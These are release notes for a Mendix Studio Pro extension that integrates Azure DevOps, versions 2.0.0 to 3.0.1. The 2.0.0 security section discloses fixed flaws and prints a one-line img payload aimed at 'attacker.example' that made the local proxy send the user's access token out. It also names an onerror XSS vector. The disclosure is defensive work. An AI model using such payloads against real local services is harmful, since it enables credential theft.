# Release Notes

## 3.0.1 — 2026-10-03 (Studio Pro 11.12 and later)

The Studio Pro 11.12+ package of 3.0.0, re-exported from Studio Pro 11.12 with the package ID
that the Mendix Marketplace now requires. There are no functional changes.

- **Studio Pro 11.12 and later** installs 3.0.1 from the Marketplace.
- **Studio Pro 10.24** stays on 3.0.0. Nothing changes for it.
- **Settings → Build** still reads `3.0.0+sp11…`, because the extension inside is the same build.

---

## 3.0.0 — 2026-10-03

A workflow release, built around one idea: the panel should know it is running inside Studio
Pro, with a Mendix app open.

It now shows the branch you are modelling on, tells you about failed builds and review requests
through native Studio Pro notifications, opens the Mendix document a work item is linked to,
generates a build pipeline for the app, searches text across build logs, groups repeated
failures by cause, and adds a `Ctrl+K` command palette. And it now runs on **Studio Pro 11.12+**
as well as 10.24.

**No breaking changes.** Nothing was removed and no API contract changed — upgrading from
2.0.0 is a drop-in replacement.

---

### At a glance

| Feature | Where | Needs |
|---|---|---|
| Branch context bar | Above every tab | A Git working copy |
| Studio Pro notifications | Bell in header + native pop-ups | — |
| Open Mendix document | Work item → Mendix Module Links | An open app |
| Mendix pipeline scaffolder | Pipelines → Setup | Git repo write access |
| Full-text + code search | Global search, `Ctrl+K` | Search extension for code/wiki |
| Build log search | Pipelines → Analysis | — |
| Failure clustering | Pipelines → Analysis | — |
| Retry a single stage | Run detail → Timeline | Server 2020+, multi-stage YAML |
| Favorite pipelines | Pipelines sidebar | — |
| Command palette | `Ctrl+K` anywhere | — |

---

### Added

#### Branch context bar

A thin row under the tabs shows the Git branch of the Mendix app you have open, the pull
request opened from that branch, and its most recent build — each clickable.

There is nothing to configure. The extension already locates your app root to store
`settings.json` there, so it reads `.git` from the same place. Switch branches outside Studio
Pro and the bar catches up the moment you click back into the panel.

- The pull request and build are looked up **only when the app's Git remote is a repository in
  the Azure DevOps project you're connected to**, and only in that repository. A branch called
  `main` exists in every repository; without this, an app on Mendix Team Server would be shown
  some other pipeline's `main` build as if it were its own. Every Azure DevOps remote form is
  recognised — HTTPS, SSH, the legacy `*.visualstudio.com` host and on-premises collection URLs.
- When there's nothing to show, the bar says why — *Mendix Team Server*, *repo not in this
  project*, *not an Azure DevOps repo* — instead of a misleading "no open PR".
- Apps that are not Git working copies — Team Server (SVN), or an app whose root can't be
  located — show no bar at all rather than an empty row or an error.
- A detached `HEAD` shows the short commit SHA and skips the pull request and build lookups,
  since there is no branch ref to match against.
- Git worktrees and `packed-refs` are both handled.

#### Retry a single build stage

A failed stage in a multi-stage YAML pipeline now has a **Retry** button in the run's Timeline
tab. Only that stage re-runs; stages that already succeeded keep their results. Previously the
only option was re-queueing the whole pipeline — on a Mendix build that means paying for the
`mxbuild` step again just to retry a flaky deployment step.

The run keeps updating live after the retry, without reopening it.

**Requires Azure DevOps Services or Server 2020+, and a multi-stage YAML pipeline.** On older
servers, and for classic or single-stage pipelines, the button does not appear — there is no
stage of their own to retry. Release stage retry, available since 1.1.0, is unaffected.

Azure DevOps can accept a retry request and then not restart anything (it answers with success
for a stage that isn't retryable). The extension checks that the build really restarted before
saying so, and tells you plainly when it didn't.

#### Favorite pipelines

Hover any build or release pipeline and click the star. Starred pipelines get a pinned
**Favorites** group at the top of the sidebar, and appear in the command palette.

Favorites are saved per connection and per app, alongside `settings.json`, so they survive a
Studio Pro restart. Switching projects shows that project's favorites — pipeline IDs collide
between projects, so a shared list would show the wrong names against the wrong pipelines.

#### Command palette

`Ctrl+K` (`Cmd+K` on macOS keyboards) opens a palette over the panel:

- **Navigate** — jump to any tab; matching is by subsequence, so `wi` finds Work Items
- **Favorites** — open a starred pipeline directly
- **Actions** — open Settings, switch theme, focus search, reload the panel
- **Results** — live search across work items, pipelines and pull requests as you type

Arrow keys move, `Enter` opens, `Esc` closes. It opens even when the search box has focus.

#### Studio Pro notifications

The extension now watches for the three things that interrupt a working day and raises a
**native Studio Pro notification** for each — so you are told with the Azure DevOps panel
closed, or not even visible:

- a build **you** queued failed in the last 24 hours
- a pull request is waiting on **your** review (your own PRs and drafts are excluded)
- a build or release approval is pending

A bell in the panel header shows the same feed with an unread count, and clicking an item goes
straight to it.

Events are identified by a stable id rather than a timestamp, because server and client clocks
disagree and Azure DevOps backfills `finishTime` — a repeated or missed pop-up is exactly what
makes a notifier untrustworthy. The first poll after startup establishes a baseline silently,
so launching Studio Pro never replays a backlog of pop-ups at you. At most three pop-ups are
raised per cycle; beyond that you get one "N more items need attention".

#### Open the Mendix document a work item is linked to

**Mendix Module Links** on a work item stopped being a notepad. With an app open, the module
and document fields are now **pickers backed by the live model** instead of free text, and every
saved link gets an **Open** button that focuses that microflow, page or entity in Studio Pro.
A link with no document opens the module's domain model.

This is the payload no browser-based Azure DevOps client can deliver.

Links are now stored **per app**, beside `settings.json`. Until now they lived in one global
file keyed only by work item id, so they bled across apps and across projects with overlapping
ids. That was invisible while links were only ever displayed; now that clicking one opens a
document, a leaked link resolves to "module not in this app". Existing links are migrated once.

Links are stored by name, so renaming a document in Studio Pro orphans its link — the Open
button then says so plainly rather than failing silently.

#### Mendix build pipeline scaffolder

**Pipelines → Setup** generates an `azure-pipelines.yml` for the open app, with the Studio Pro
version and `.mpr` filename filled in from the model — the two things hand-written Mendix
pipelines get wrong most often. Two flavours:

| Target | Runs on | mxbuild from |
|---|---|---|
| Self-hosted Windows | Your own agent pool | The Studio Pro install on the agent |
| Hosted Linux | `ubuntu-latest` | Mendix CDN tarball, per run |

The YAML is shown in full for review first; committing it is a separate, explicit action that
names the repository, branch and file it will write. Committing uses the branch tip as an
optimistic concurrency check, so it cannot quietly overwrite someone else's commit, and it
refuses to replace an existing file unless you tick the box.

This produces a **starting template, not a finished pipeline.** Agent pool names, service
connections and deployment targets are site-specific and are emitted as clearly marked TODOs.

#### Real search

Work item search now goes through the Azure DevOps **Search service**, which does
relevance-ranked full-text matching — it finds text in descriptions, comments and custom
fields, none of which WIQL can query. **Code** and **wiki** search were added on the same path.

Pipelines and pull requests have no search API and remain a name filter over a listing, but
that is now a deliberate fallback rather than the whole feature.

On Azure DevOps Server the Search service is a separately installed extension. Availability is
probed once and remembered; when it is absent, work item search falls back to the previous
title-only query and the results panel explains why code and wiki results are missing, instead
of silently returning nothing.

#### Build log search

**Pipelines → Analysis → Log search** searches the *contents* of recent build logs — plain text
or regular expression, optionally restricted to failed runs. Azure DevOps has no API for this;
it is assembled by fetching logs across builds, so the number of builds to scan is a visible
control rather than a hidden default.

#### Failure clustering

**Pipelines → Analysis → Failure clusters** groups recent failed builds by what actually broke.
Error text is normalised — paths, GUIDs, timestamps, hex addresses and line numbers stripped —
so the same fault across ten runs shows as one cluster of ten rather than ten separate red rows.
Expand a cluster to see the builds and jump to any of them.

---

#### Studio Pro 11 support

3.0.0 ships as **two builds**, because the two Studio Pro lines run on different .NET runtimes
and an extension is loaded into Studio Pro's own process:

| Studio Pro | Runtime | Package |
|---|---|---|
| 10.24 | .NET 8 | Studio Pro 10.24 package |
| 11.12 (LTS) and later | .NET 10 | Studio Pro 11.12+ package |

Both have identical features. The 11.12+ package does not load in 10.24, and the 10.24 package
is not supported on Studio Pro 11. Install the one that matches your
Studio Pro; **Settings → Build** shows `sp10` or `sp11` in the backend stamp so you can confirm
which one loaded.

---

### Changed

- **Supported Studio Pro versions are now 10.24 and 11.12+.** Earlier listings said "10.12 or
  later", but the extension has always been compiled against 10.24, and 3.0.0 uses Studio Pro
  services that were not verified on earlier versions.
- **Two new PAT scopes for two features.** *Build — Read & execute* to retry a build stage, and
  *Code — Read & write* to commit a generated pipeline. Existing PATs keep working; only those
  two actions need the wider scope.
- The **Settings → Build** panel now reports `3.0.0+sp10.build.yyMMdd.HHmmss` (or `sp11`) as
  the backend stamp.
- Global search results are reachable from the command palette in addition to the search box.
- **Mendix module links moved** from a single global file to a per-app store beside
  `settings.json`. Existing links migrate automatically on first run.
- The extension now requests one additional Studio Pro service (`INotificationPopupService`).
- **Readable Azure DevOps errors.** Failures used to surface as the raw JSON Azure DevOps
  returns — hundreds of characters with the actual reason buried inside. They're now one
  sentence. An expired or rejected PAT says exactly that and points you to the Settings tab.
- **An expired PAT no longer fails silently.** Every feature stops working when a PAT expires
  (they do by default), and until now you only found out by opening the panel. You now get one
  Studio Pro notification per session, and the notification bell shows the error instead of
  "Nothing needs your attention".

---

### Known limitations in this release

- **Studio Pro pop-ups have no icon.** The notification API takes an image that can only be
  built from a file or embedded resource, and the extension ships neither, so it relies on
  Studio Pro's default — verified to display on Studio Pro 11.14. Should a version reject it,
  pop-ups disable themselves after the first failure (logged once) and the in-panel bell carries
  on unaffected; **Settings → Build → Pop-ups** shows which state you are in.
- **Mendix links are stored by name.** Renaming a document or module in Studio Pro orphans the
  link; Open then reports it rather than opening the wrong thing.
- **Log search and clustering scale with the builds you scan.** Each build costs one or more
  Azure DevOps calls. Fetches are capped at six concurrent and 200 KB per log, and completed
  logs are cached for 30 minutes, but scanning 50 builds is meaningfully slower than 10.
- **The generated Linux pipeline downloads mxbuild from Mendix's CDN.** The exact tarball name
  has varied between major versions; if the download 404s, use the Windows template.

---

### Upgrading from 2.0.0

Install the version that matches your Studio Pro from the Mendix Marketplace (3.0.0 for 10.24,
3.0.1 for 11.12 and later) and **restart Studio Pro** — the DLL is loaded in-process, so reloading
the extension is not enough if an instance still holds the port. Confirm **Settings → Build →
Backend** reads `3.0.0+sp10…` or `3.0.0+sp11…`.

Connections, PATs, port settings, and work-item links all carry over untouched. Favorites
start empty; this is the first release that has them.

If the panel does not appear at all after upgrading, check the Studio Pro log for a composition
error: this release requests `INotificationPopupService` in addition to the services 2.0.0 used.

---

## 2.0.0 — 2026-08-01

A security-focused release. Two vulnerabilities that could expose your Personal Access Token
are closed, all externally-authored HTML is now sanitized before rendering, and the Settings
tab gained a build panel so you can confirm which build Studio Pro is actually running.

**This is a major version because the local API contract changed** — see
[Breaking changes](#breaking-changes).

---

### Security

#### The local API is now token-gated

The extension's backend listens on `http://localhost:5678`. Previously it had no
authentication of any kind, which meant **any web page you visited while Studio Pro was open
could drive it**. Because several endpoints proxy requests using your stored PAT, a hostile
page could harvest the credential with nothing more than:

```html
<img src="http://localhost:5678/api/attachments/proxy?url=https://attacker.example/">
```

A plain `GET` from an `<img>` needs no CORS preflight, so the request fired and the PAT
landed in the attacker's access log.

The host now generates a random 256-bit token at every start and injects it into the
`index.html` it serves. Every `/api/*` request must present it — as an `X-Ado-Token` header
for `fetch` calls, or a `?t=` query parameter for `<img src>` / `<a href>` URLs, which can't
send headers. Comparison is constant-time. `index.html` is served with `no-store` so a cached
copy can never carry a stale token.

#### Proxy targets are restricted to your Azure DevOps host

`/api/attachments/proxy`, `/api/attachments/download`, and `/api/releases/log` take a target
URL from the caller and forward it **with the PAT attached**. Nothing validated that URL, so
the proxy would send your credential anywhere it was pointed — including internal network
addresses and cloud metadata endpoints.

The host is now checked before any credential is sent. Only the configured organization host
is permitted, plus Microsoft's own sibling domains (`dev.azure.com`, `visualstudio.com`,
`vsassets.io`) when connected to Azure DevOps Services. On-premises installs may only ever
talk to their own configured host. Non-HTTP schemes such as `file://` are rejected outright.

#### All external HTML is sanitized

Work item descriptions and comments, wiki Markdown output, and rich-text editor content are
authored by anyone with write access to your project. That HTML was previously assigned
straight to `innerHTML`. This doesn't run `<script>`, but it very much runs
`<img src=x onerror=…>` — and script executing inside the pane shares an origin with the
local backend, so it could read the session token and drive the PAT-bearing endpoints.

All three render paths now go through DOMPurify. Legitimate content is preserved: inline
`style` attributes (ADO's own editor emits them heavily), `data:` image previews, attachment
images, mention anchors, and tables all render exactly as before. Links in rendered content
now carry `target="_blank"` and `rel="noopener noreferrer"`.

---

### Fixed

- **Inline images disappeared while editing a description.** Read mode routed attachment
  images through the authenticated proxy; the editor dropped the raw Azure DevOps URL into
  `<img src>`, where the browser had no PAT to send and the image silently failed to load. It
  looked like editing had deleted the image, and it reappeared on cancel. The editor now uses
  the same proxy path, and restores the original URL before anything is submitted — the proxy
  URL and its token are never written back into a work item.

  *No data was ever lost to this: the image element was always present with the correct URL,
  so descriptions saved from that state were written back correctly.*

- **Settings did not survive a restart** — saved connections and the server port reverted to
  defaults every time Studio Pro restarted. `settings.json` was written next to the loaded DLL,
  but Studio Pro doesn't run the extension from `extensions\MendixAzureDevOpsExtension\`: it
  copies it into `{AppDir}\.mendix-cache\extensions-cache\{guid}\` and loads it from there. That
  cache is regenerated on sync, taking the settings with it. Settings are now anchored to the
  Mendix app root (the nearest folder containing the `.mpr`), which is stable and still isolated
  per app; `%APPDATA%` remains the fallback. Settings found in an old cache folder are migrated
  across automatically on first run.

- **The panel showed the status page on startup** and only worked after closing and reopening
  it. Studio Pro can restore a previously-open pane before the extension's load event fires, so
  the pane navigated before the server had a port or session token. Opening a pane now ensures
  the backend is started first.

- **Settings location is now visible** in the Settings → Build panel, with a warning if it ever
  resolves somewhere volatile.

- **Stale frontend bundles could accumulate** in the build output and ride along into
  deployments. The deploy step now produces exactly the current build.

---

### Added

- **Build panel in the Settings tab.** The extension's two halves reload independently — the
  SPA on a pane refresh, the DLL only when Studio Pro reloads the extension — so a change can
  land in one and not the other. The panel shows four stamps and tells you which side is stale:

  | Row | Meaning |
  |---|---|
  | UI bundle | When the loaded frontend bundle was built |
  | Backend | Build stamp compiled into the DLL (`2.0.0+build.yyMMdd.HHmmss`) |
  | DLL built | Last-write time of the DLL on disk |
  | Loaded at | When Studio Pro last started the backend |

  If **DLL built** is newer than **Loaded at**, Studio Pro is still running the previous DLL.
  If **UI bundle** is older than your last build, press **F5** in the pane.

- **`GET /api/version`** — reports the build stamp, the DLL's path and timestamp, and when the
  backend started. Token-gated like every other endpoint.

- **Configurable server port**, under a new **General** section at the top of the Settings tab.
  The default (`5678`) is shown inline, along with the port currently in use. The port is
  validated on save — range-checked and rejected if another application already holds it — and
  applies when Studio Pro next starts, since this panel is served from the port being changed.

- **Status page for browser visitors.** Opening `http://localhost:5678` in a normal browser
  used to serve the app shell — which couldn't function outside the pane, and handed over the
  session token to whoever asked. It now shows a small status card identifying the extension
  and reporting health: version, port, uptime, and how many connections are configured. No
  session token, no organization details. The dockable pane is unaffected: it loads a URL
  carrying the token and still gets the full app.

- **`GET /health`** — unauthenticated JSON status (`status`, `name`, `version`, `port`,
  `startedUtc`) for scripts and monitors. Carries nothing sensitive.

- **Automatic port fallback.** If the configured port is taken at startup, the server now falls
  back to the default and then to any free port, rather than silently failing to bind and
  leaving a blank pane. The dockable pane navigates to whatever port was actually bound, and
  the Settings panel flags any divergence between configured and running.

---

### Changed

- **Build no longer depends on a specific ASP.NET Core runtime being installed.** The bundled
  framework assemblies come from a locally installed runtime when present, otherwise from a
  NuGet runtime pack, instead of a hard-coded `8.0.21` path that failed on most machines.
- **Settings moved to a durable, per-app location** — `{AppRoot}\extensions\MendixAzureDevOpsExtension\settings.json`,
  with `%APPDATA%` as fallback. Existing settings are migrated automatically on first run.
- **New dependency:** `dompurify` ^3.4.

---

### Breaking changes

- **Any external tooling that called `http://localhost:5678/api/*` directly will now get
  `401`.** Requests must carry the session token, which is only available to the page the
  backend serves. There is no opt-out.
- **Rendered HTML is filtered.** `<script>`, `<iframe>`, `<form>`, inline SVG, and event
  handler attributes are stripped from work item, comment, and wiki content at render time.
  The stored content in Azure DevOps is untouched — this affects display only.
- **A full Studio Pro restart is required.** The DLL is loaded in-process; an instance holding
  the port will keep serving the old build until it exits. Confirm via the Build panel.

---

### Upgrading from 1.x

1. Deploy the new build, then **restart Studio Pro** — reloading the extension is not enough if a
   previous instance still holds the port.
2. Open **Settings → Build** and confirm `Backend` reads `2.0.0`, and that the `Settings` row points
   at your app folder rather than anywhere under `.mendix-cache`.
3. Your connections and PAT carry over automatically. If they don't appear, they were lost to the
   settings bug this release fixes — re-add the connection once and it will persist from now on.
